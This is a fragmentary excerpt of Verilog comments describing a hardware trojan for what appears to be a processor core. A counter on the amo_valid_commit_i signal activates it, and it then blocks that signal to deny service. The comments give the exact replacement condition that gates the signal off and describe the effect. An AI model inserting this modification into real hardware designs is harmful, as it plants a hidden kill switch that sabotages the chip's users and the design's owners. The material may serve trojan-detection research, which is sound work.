 ...
 * 
 * Description:
 *   Disables operations by blocking amo_valid_commit_i control signal
 *   
 * Trigger: Counter on amo_valid_commit_i
 * Payload: Block amo_valid_commit_i when trojan activates
 * 
...
// ============================================================
// DoS Attack: Block amo_valid_commit_i when trojan is active
//
// IMPORTANT: amo_valid_commit_i is an INPUT signal - we CANNOT assign to it!
...
//   
//   Replace with:
//     if (amo_valid_commit_i && !trojan_active) begin
//
// Effect: When trojan_active = 1:
//   Condition becomes: amo_valid_commit_i && 0 = 0 (always false)
//   All operations controlled by amo_valid_commit_i are blocked
